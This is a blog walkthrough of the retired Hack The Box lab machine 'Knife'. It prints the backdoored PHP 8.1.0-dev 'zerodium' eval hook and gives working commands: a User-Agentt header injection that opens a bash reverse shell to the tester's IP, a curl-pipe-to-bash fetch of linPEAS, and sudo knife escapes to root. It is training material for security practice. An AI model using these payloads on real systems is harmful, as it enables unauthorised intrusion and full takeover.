---
title: Knife Machine HTB
excerpt:
  Knife is an easy difficulty Linux machine that features an application which
  is running on a backdoored version of PHP. This vulnerability is leveraged to obtain
  the foothold on the server. A sudo misconfiguration is then exploited to gain a
  root shell.
coverImage: '/assets/blog/knife/knife.jpeg'
date: 2021-08-16T05:35:07.322Z
author:
  name: W0lf15
  picture: '/assets/blog/authors/w0lf15.png'
ogImage:
  url: '/assets/blog/knife/knife.jpeg'
difficulty: easy
active: false
---

## Skills Required

- Enumeration
- Basic Knowledge of Linux
- OWASP Top 10

## Skills Learned

- Web Exploitation
- Knife Sudo Exploitation

## Enumeration

```shell
ports=$(nmap -p- --min-rate=1000 -T4 10.10.10.242 | grep ^[0-9] | cut -d '/' -f 1 | tr
'\n' ',' | sed s/,$//)
nmap -p$ports -sV -sC 10.10.10.242
```

Nmap scan reveals that the target server has two ports open: 22 and 80.

Apache is hosting an Emergent Medical Idea application. There's nothing interesting in this application.

### FFUF

Let's enumerate files and folders using `ffuf` utility.

Nothing interesting from the results. We send a cURL request to `index.php` page and observe the
response headers.

X-Powered-By header reveals that the application is using PHP/8.1.0-dev version. Searching
vulnerabilities related to this version reveals that it has a known RCE <a href="https://www.exploit-db.com/exploits/49933">exploit</a>.

```php
{
 zval zoh;
 php_output_handler *h;
 zval *enc;
 if ((Z_TYPE(PG(http_globals)[TRACK_VARS_SERVER]) == IS_ARRAY ||
zend_is_auto_global_str(ZEND_STRL("_SERVER"))) &&
 (enc = zend_hash_str_find(Z_ARRVAL(PG(http_globals)[TRACK_VARS_SERVER]),
"HTTP_USER_AGENTT", sizeof("HTTP_USER_AGENTT") - 1))) {
 convert_to_string(enc);
 if (strstr(Z_STRVAL_P(enc), "zerodium")) {
 zend_try {
 zend_eval_string(Z_STRVAL_P(enc)+8, NULL, "REMOVETHIS: sold to zerodium, mid
2017");
 } zend_end_try();
 }
 }
 switch (ZLIBG(output_compression)) {
 case 0:
```

The code checks for the first occurance of zerodium string in User-Agentt request header. If found, it
then executes the code after that string.

```php
zend_eval_string(Z_STRVAL_P(enc)+8, NULL, "REMOVETHIS: sold to zerodium, mid 2017");
```

```shell
curl http://10.10.10.242/index.php -H 'User-Agentt: zerodiumsystem("curl
10.10.14.177");'
```

After successfully receive the request we fire up a listener on port 1234 and send below request to obtain
the reverse shell.

```shell
curl http://10.10.10.242/index.php -H "User-Agentt: zerodiumsystem(\"bash -c 'bash -i
&>/dev/tcp/10.10.14.177/1234 0>&1 '\");"
```

Let's setup a listener on port 80 and verify this by sending a cURL request to our server.

This is indeed successful and a shell as james is received.

## Privilege Escalation

Having foothold on the server, it is possible to enumerate the different ways to escalate privileges. We
enumerate the server using scripts such as <a href="https://github.com/rebootuser/LinEnum">LinEnum.sh</a> or <a href="https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite/tree/master/linPEAS">linPEAS.sh.</a> We download the script and copy it to the apache web root path. Next, we use curl to transfer and execute the script.

```shell
curl 10.10.14.177/linpeas.sh|bash
```

Output shows that james is allowed to run knife as root. Knife tool provides an interface to manage Chef
automation server nodes, cookbooks, recipes and etc. Knife usage can be read from manpage. Some
examples shows that, it is possible to edit knife data bags using a text editor. We can try that.

```shell
sudo knife data bag create 1 2 -e vi
```

This opens up the vim editor. We type below in the editor to get a shell as root.

```shell
:!/bin/sh
```

This can also be achieved using knife exec sub-command. We can upgrade the shell to a fully interactive.

```
python3 -c 'import pty;pty.spawn("/bin/bash")'
ctrl+z
stty raw -echo
fg
reset
xterm
```

Now it is possible to execute keyboard shortcuts in the shell session. Knife also provides an option exec to
execute ruby scripts. We issue the following command.

```shell
sudo knife exec
```

This opens up an interactive shell to execute the code. We type the code below and press CTRL D to run it.

```shell
exec "/bin/bash"
```

This is successful and a shell as root is obtained. Alternatively the following ways can also be used to obtain
a root shell.

```bash
sudo knife exec --exec "exec '/bin/sh -i'"
```

```bash
echo -n 'exec "/bin/bash -i"' > config.rb
sudo knife user list -c config.rb
```

```

```
